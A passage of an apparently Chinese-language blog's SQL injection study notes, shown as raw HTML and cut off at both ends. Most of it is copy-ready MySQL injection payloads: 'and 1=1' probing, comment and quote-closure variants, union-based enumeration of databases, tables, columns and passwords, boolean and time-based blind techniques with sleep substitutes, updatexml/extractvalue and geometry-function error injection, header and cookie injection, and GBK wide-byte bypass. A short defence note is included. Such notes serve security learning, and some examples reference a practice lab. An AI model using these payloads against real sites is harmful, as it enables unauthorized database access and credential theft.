class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">#先在链接地址后加上 <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>，提交<br>xxx.com<span class="hljs-operator">/</span>xx.php?id<span class="hljs-operator">=</span>xx <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br>#再替换为<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>，提交<br>xxx.com<span class="hljs-operator">/</span>xx.php?id<span class="hljs-operator">=</span>xx <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span><br>#如果返回不同的页面， 那么说明存在 <span class="hljs-keyword">SQL</span> 注入漏洞。<br></code></pre></td></tr></table></figure><p>  更多方法</p><ul><li>两者组合如：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;and 1=1 / and 1=2</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1 / and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">2</span><br><span class="hljs-string">&#x27;and 1 like 1/ and 1 like 2</span><br></code></pre></td></tr></table></figure><ul><li><p>更多组合加闭合：</p><p>在插入的注入语句后面，增加<code>--+</code>或<code>#</code>,用以注释掉后面的正常语句<code>#    </code>有时会被过滤，因此可以使用url编码，将#表文<code>%23</code>单引号也有可能会被过滤，可以换成双引号</p><p>   可以在引号后加一两个括号，用以实现可能的语句闭合，如</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>–<span class="hljs-operator">+</span><br><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#<br><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">23</span><br><span class="hljs-string">&#x27;or 1=1–+</span><br><span class="hljs-string">&quot;or 1=1–+</span><br><span class="hljs-string">)or 1=1–+</span><br><span class="hljs-string">&#x27;</span>)<span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>–<span class="hljs-operator">+</span><br>&quot;) or 1=1–+<br>&quot;))<span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>–<span class="hljs-operator">+</span><br></code></pre></td></tr></table></figure><h3 id="如果存在注入"><a href="#如果存在注入" class="headerlink" title="如果存在注入"></a>如果存在注入</h3><ol><li>首先看是否有回显</li></ol><ul><li>有回显的话判断<strong>显示位置</strong>和<strong>列数</strong><ul><li>通过order by num （num&#x3D;1,2,3···）当报错时的前一个数就是列数</li><li>通过 select 1,2,3···来查询显示位置（sql语句中 select 1,2,3这样的语句会直接将1,2,3 输出）</li></ul></li><li>无回显可以考虑<strong>盲注</strong>入、<strong>报错注入</strong>、</li></ul><ol start="2"><li><p>再通过各个注入方式来进行下一步注入</p><p>如mysql &gt;&#x3D; 5.0的联合注入就有</p><ul><li>0x01 获取字段数</li></ul></li></ol><ul><li><p>通过order by num （num&#x3D;1,2,3···）当报错时的前一个数就是列数</p></li><li><p>0x02 获取系统数据库</p><ul><li><p><code>select null,null,schema_name from information_schema.schemata</code></p></li><li><p>0x03 获取当前数据库</p></li><li><p><code>select null,null,database()</code></p></li></ul></li><li><p>0x04 获取数据库表</p><ul><li><code>select null,null,...,group_concat(table_name) from information_schema.tables where table_schema=database()</code></li><li><code>select null,null,...,table_name from information_schema.tables where table_schema=database() limit 0,1</code></li></ul></li><li><p>0x05 获取字段名</p><ul><li><code>select null,null,...,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;</code></li></ul></li><li><p>0x06 获取数据</p><ul><li><code>select group_concat(字段名,字段名) from (tableName)</code></li></ul></li></ul><h2 id="各个注入方式的原理"><a href="#各个注入方式的原理" class="headerlink" title="各个注入方式的原理"></a>各个注入方式的原理</h2><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p>所谓联合查询注入即是使用union合并<strong>两个或多个</strong>SELECT语句的结果集，第二个语句中就包含我们想要查询的语句</p><blockquote><p>注意：union查询的子语句的字段数要与它前面主语句的字段数要要一致</p></blockquote><ul><li>如一个sql语句为</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> id,username,password <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>  <img src="/./SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/image-20220228222516819.png"></p>  <img src="/2022/04/23/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/image-20220228222516819.png" class="" title="sql"><p>  当使用union查询时：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> id,username,password <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><p>  <img src="/./SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/image-20220228222638933.png"></p>  <img src="/2022/04/23/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/image-20220228222638933.png" class="" title="sql2"><p>  所以一般的union注入拼接为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"># payload<br>a<span class="hljs-string">&#x27; union select database(),user(),version() #%</span><br></code></pre></td></tr></table></figure><p><strong>union 操作符一般与 order by 语句配合使用来确定可以查询的字段个数</strong></p><blockquote><p>因为查询的字段不能超过主查询的字段，可以先在 SQL 语句后面加 order by 进行排序，通过报错内容确定到底有几个字段可供使用</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">#采用二分法找到最大的可排序列，即是可查询的字段个数<br>a<span class="hljs-string">&#x27; order by 4 #% </span><br><span class="hljs-string"># 假定最后4不报错，5报错，则可确定有4个字段,payload可以这样</span><br><span class="hljs-string">a&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> database(),<span class="hljs-keyword">user</span>(),version(),<span class="hljs-number">4</span> #<span class="hljs-operator">%</span><br># 如果第二个字段才能显示在屏幕上，那么payload需这样凑成四个字段<br>a<span class="hljs-string">&#x27; union select 1,username,3,4 from user #%</span><br></code></pre></td></tr></table></figure><h3 id="时间盲注-BOOL盲注"><a href="#时间盲注-BOOL盲注" class="headerlink" title="时间盲注&#x2F;BOOL盲注"></a>时间盲注&#x2F;BOOL盲注</h3><p>当我们的注入语句被带入数据库查询，页面确不能回显我们的结果，如应用程序就会返回一个“通用的”的页面或特定的语句，我们不能以此来判断注入是否成功，这种情况下就要用到sql盲注的技巧了。</p><h4 id="布尔盲注原理"><a href="#布尔盲注原理" class="headerlink" title="布尔盲注原理"></a>布尔盲注原理</h4><p>只返回布尔值的sql注入漏洞，通过构造语句,来判断数据库信息的正确性,再通过页面反回的布尔值,来判断正确与否</p><h4 id="布尔盲注方法"><a href="#布尔盲注方法" class="headerlink" title="布尔盲注方法"></a>布尔盲注方法</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sql">#substr()函数,截取某个字符串，与后面的字符串或数字对比<br>k<span class="hljs-string">&#x27; and substr((select database()),1,1)=&#x27;</span>s<span class="hljs-string">&#x27;</span><br><span class="hljs-string">#left()函数,截取前几个字符与期望值对比</span><br><span class="hljs-string">k&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">left</span>((database()),<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;s&#x27;</span><br>#regexp函数,用正则判断<br>k<span class="hljs-string">&#x27; and select user() regexp &#x27;</span><span class="hljs-operator">^</span>r<span class="hljs-string">&#x27;</span><br><span class="hljs-string">#like函数</span><br><span class="hljs-string">k&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;ro%&#x27;</span><br># 爆破库、表、字段长度<br>k<span class="hljs-string">&#x27; and select length(database())&lt;xx</span><br><span class="hljs-string"></span><br><span class="hljs-string">#有些sql漏洞中,会屏蔽引号,因此更多采用将截取出来的字符串转为ascii码,再对比ascii码值</span><br><span class="hljs-string">#ascii和ord函数功能相同,大于、小于、等于配合二分法使用</span><br><span class="hljs-string">k&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">114</span><br>k<span class="hljs-string">&#x27; and ascii(substr((select database()),1,1))&gt;114</span><br><span class="hljs-string">k&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&lt;</span><span class="hljs-number">20</span><br><br>ord(substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">114</span><br></code></pre></td></tr></table></figure><h4 id="时间盲注原理"><a href="#时间盲注原理" class="headerlink" title="时间盲注原理"></a>时间盲注原理</h4><p>语句执行后,不回显,不报错,不提示真假的sql注入漏洞。可以通过构造语句,通过条件语句判断,为真则立即执行,否则延时执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">#确实是否有注入点，如果相应时间是自定义的睡眠时间，则大概率有注入点<br>k<span class="hljs-string">&#x27; and sleep(x) #</span><br><span class="hljs-string">#然后通过之前的函数，猜测库、表、字段  </span><br><span class="hljs-string">k&#x27;</span> <span class="hljs-keyword">and</span> if(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">115</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>));<br>k<span class="hljs-string">&#x27; and ascii(substr(database(),1,1))&gt;115 and sleep(5); #这样是因为sql的and or的判断顺寻是从左到右的</span><br><span class="hljs-string">#也可以先通过sleep计算出库、表、字段长度</span><br><span class="hljs-string">k&#x27;</span> <span class="hljs-keyword">and</span> sleep(length(database()))<br></code></pre></td></tr></table></figure><blockquote><p>当过滤sleep时还有其他延时方法如：</p><p><strong>get_lock()</strong><br><code>get_lock(key,time)</code>，该函数的意思是给一个<code>key</code>上锁，如果上锁失败就等待<code>time</code>秒，然后回滚事务。</p><blockquote><p>利用方式：先使用<code>get_lock(key,time)</code>将<code>key</code>上锁，然后再开一个进程使用<code>get(key,time)</code>，这时候就会因为原来的<code>key</code>已经被上锁了而会等待<code>time</code>秒</p></blockquote><p><strong>benchmark()</strong><br><code>benchmark(count,expr)</code>，该函数会重复计算<code>expr</code>表达式<code>count</code>次从而消耗大量时间。</p><blockquote><p>if((布尔盲注语句),BENCHMARK(10000000,md5(‘a’)),1)</p></blockquote><p><strong>笛卡尔积</strong><br>这里的笛卡尔积和离散数学里的笛卡尔积的意思是一样的，因为mysql支持多表查询，笛卡尔积可以将多个表合并成一个表，但是如果多个表中的数据较多就会导致运算过程中耗费大量的时间。</p><blockquote><p>if((布尔盲注语句),(select count(*) from information_schema.columns A,information_schema.columns B, information_schema.columns C),1)</p></blockquote><p><strong>RLIKE</strong><br>语法规则：</p><ul><li><code>A RLIKE B</code>，表示B是否再A里面。</li><li>B中的表达式可以使用标准的正则语法。</li></ul><p>利用方式：</p><blockquote><p>if((布尔盲注语句),concat(rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’),rpad(1,999999,’a’)) RLIKE ‘(a.<em>)+(a.</em>)+(a.<em>)+(a.</em>)+(a.<em>)+(a.</em>)+(a.*)+b’,1)</p></blockquote></blockquote><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>当数据库的函数被传入错误参数时，会发生语法错误，正常情况下这类错误不应该回显到前端页面，但当中间件或程序未正常屏蔽时导致错误信息输出到屏幕上，就能用来进行报错注入了。<br>select&#x2F;insert&#x2F;update&#x2F;delete都可以被用来报错注入<br><strong>报错注入条件：</strong></p><ol><li>后台没有屏蔽数据库报错信息,在语法发生错误时会输出在前端</li><li>运维人员设置中间件的时候，错误输出没有屏蔽</li><li>程序员写网站代码的时候，没有屏蔽错误信息输出</li></ol><p><strong>优缺点：</strong></p><ol><li>优点是注入速度快</li><li>缺点是语句较为复杂，而且只能用<strong>limit</strong>依次进行猜解</li></ol><p>总体来说，报错注入其实是一种公式化的注入方法，主要用于在页面中没有显示位，但是用mysql输出了错误信息时使用。</p><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><p><code>floor()</code>：MYSQL 中用来取整的函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat((<span class="hljs-keyword">select</span> version())),<span class="hljs-built_in">floor</span>(rang(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>);<br>#concat 连接字符串功能<br>#floor  取<span class="hljs-type">float</span>的整数值<br>#rang   取<span class="hljs-number">0</span><span class="hljs-number">-1</span>之间随机浮点值<br>#<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>   对结果集进行排序<br><span class="hljs-keyword">select</span> verson()就是我们用来做<span class="hljs-keyword">sql</span>注入的语句<br></code></pre></td></tr></table></figure><p>extractvalue()：MYSQL 对 XML 文档数据进行查询的 XPATH 函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>));<br>#extractvalue():接收<span class="hljs-number">2</span>个参数,第一个xml文档,第二个xpath语句<br>#用concat构造一个错误的xpath字符串,使extractvalue函数报错,显示出构造的<span class="hljs-string">&#x27;错误&#x27;</span>字符串<br></code></pre></td></tr></table></figure><p><code>updatexml()</code>：MYSQL 对 XML 文档数据进行查询和修改的 XPATH 函数<br><strong>最常用的报错注入函数</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br>#接收<span class="hljs-number">3</span>个参数,第一个xml文档,第二个xpath语句,第三个字符串<br>#原理和extravtvalue一样,构造错误的xpath语句报错<br></code></pre></td></tr></table></figure><h4 id="updatexml报错实战"><a href="#updatexml报错实战" class="headerlink" title="updatexml报错实战"></a>updatexml报错实战</h4><p><code>select</code>、<code>delete</code>语句注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">#<span class="hljs-number">1</span> 爆数据库版本信息<br>k<span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) #</span><br><span class="hljs-string">#2 爆数据库当前用户</span><br><span class="hljs-string">k&#x27;</span> <span class="hljs-keyword">and</span>  updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) #<br>#<span class="hljs-number">3</span> 爆数据库<br>k<span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) #</span><br><span class="hljs-string">#4 爆表名</span><br><span class="hljs-string">## 反馈回的错误表示只能显示一行，所以采用limit来一行一行显示</span><br><span class="hljs-string">k&#x27;</span><span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;pikachu&#x27;</span>)),<span class="hljs-number">0</span>) #<br>#<span class="hljs-number">5</span> 爆字段<br>k<span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27;limit 2,1)),0) #</span><br><span class="hljs-string">#6 爆字段内容</span><br><span class="hljs-string">k&#x27;</span> <span class="hljs-keyword">and</span>  updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">0</span>) #<br></code></pre></td></tr></table></figure><p><code>insert</code>、<code>update</code>、注入<br>增、改同样可以用来进行报错注入，只是需要前后分别用or语句连接，使语句完整，一般需要抓包用bp改参数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 原语句<br><span class="hljs-keyword">insert into</span> xxx id <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;k&#x27;</span>);<br># 报错注入语句<br>k<span class="hljs-string">&#x27; or updatexml(1,concat(0x7e,(命令)),0) or&#x27;</span><br># 组合后语句<br><span class="hljs-keyword">insert into</span> xxx id <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;k&#x27;</span> <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(命令)),<span class="hljs-number">0</span>) <span class="hljs-keyword">or</span><span class="hljs-string">&#x27;&#x27;</span>);<br></code></pre></td></tr></table></figure><p><code>head</code>和<code>cookie</code>注入<br>如果代码调用了head或cookie中的信息拿到数据库进行拼接，也可以用报错注入尝试<br>同样是先用单引号找到注入点，在进行注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"># http head头注入，假如是对浏览器类型的检测<br>Mozilla <span class="hljs-string">&#x27; or updatexml(1,concat(0x7e,database ()),0) or &#x27;</span><br># cookie注入，假如原cookie为 ant[uname]<span class="hljs-operator">=</span>admin<br>ant[uname]<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27; and updatexml (1,concat(0x7e,database()),0) #</span><br></code></pre></td></tr></table></figure><h4 id="其他常用exp"><a href="#其他常用exp" class="headerlink" title="其他常用exp"></a>其他常用exp</h4><ul><li>floor()和rand()</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),<span class="hljs-number">2</span>,concat(<span class="hljs-string">&#x27;:&#x27;</span>,(<span class="hljs-keyword">select</span> database()),<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-built_in">floor</span>(rand()<span class="hljs-operator">*</span><span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a       <span class="hljs-comment">/*利用错误信息得到当前数据库名*/</span><br></code></pre></td></tr></table></figure><ul><li>2 extractvalue()</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>)))<br></code></pre></td></tr></table></figure><ul><li>3 updatexml()</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><ul><li>4 geometrycollection()</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> geometrycollection((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br></code></pre></td></tr></table></figure><ul><li>5 multipoint()</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multipoint((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br></code></pre></td></tr></table></figure><ul><li>6 polygon()</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> polygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br></code></pre></td></tr></table></figure><ul><li>7 multipolygon()</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multipolygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br></code></pre></td></tr></table></figure><ul><li>8 linestring()</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> linestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br></code></pre></td></tr></table></figure><ul><li>9 multilinestring()</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multilinestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br></code></pre></td></tr></table></figure><ul><li>10 exp()</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a))<br></code></pre></td></tr></table></figure><h3 id="其他注入方式"><a href="#其他注入方式" class="headerlink" title="其他注入方式"></a>其他注入方式</h3><p>都是面对php代码或配置,对输入的单引号进行转义时,在处理用户输入数据时存在问题,可以绕过转义</p><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>GBK处理编码的过程存在问题，可以构造数据消灭转义符<code>\</code></p><h5 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h5><p>在对单双引号进行了转义过滤的情况下,前面的注入方式都不好使,但可以在引号前加上<code>%df</code>再进行sql注入尝试<br>它的原理是</p><ol><li><code>\&#39;</code>编码后的值为<code>%5C%27</code></li><li>使用GBK编码数据库时,两个字符为一个汉字</li><li>ASCII码只有128个,大于128的,就会和第二个字符组成一个汉字</li><li>使用<code>%df\&#39;</code>,编码后为<code>%df%5C%27</code><br>第一个码大于128,因此会使用前两个字符<code>運</code>,最后单剩一个引号<br>即编码后的值为<code>運&#39;</code></li><li>然后就可以正常进行sql注入了</li></ol><h5 id="宽字节注入方法"><a href="#宽字节注入方法" class="headerlink" title="宽字节注入方法"></a>宽字节注入方法</h5><p>黑盒测试的话:在可能的注入点后,键入<code>%df&#39;</code>后,进行测试<br>白合测试的话:</p><ol><li>查看mysql编码是否为GBK</li><li>是否使用<code>preg_replace</code>转换单引号为<code>\&#39;</code></li><li>是否使用addslashes进行转义</li><li>是否使用mysql_real_escape_string进行转义</li></ol><h5 id="宽字节注入防范"><a href="#宽字节注入防范" class="headerlink" title="宽字节注入防范"></a>宽字节注入防范</h5><ol><li>使用utf-8,可以避免宽字节注入<br>不仅在gbk中,韩文、日文等都是宽字节</li><li>使用<code>mysql_real_escape_string</code>方法转义<br>需同时设置<code>mysql_set_charset(&#39;gbk&#39;,$conn)</code></li><li>可以设置mysql连接参数:<code>character_set_clinet=binary</code></li></ol><h4 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h4><p>php代码中用了urldecode()等编码函数,对url中的特殊字符进行编码,可以利用此函数与php自身编码转换,产生漏洞</p><h5 id="二次编码注入原理"><a href="#二次编码注入原理" class="headerlink" 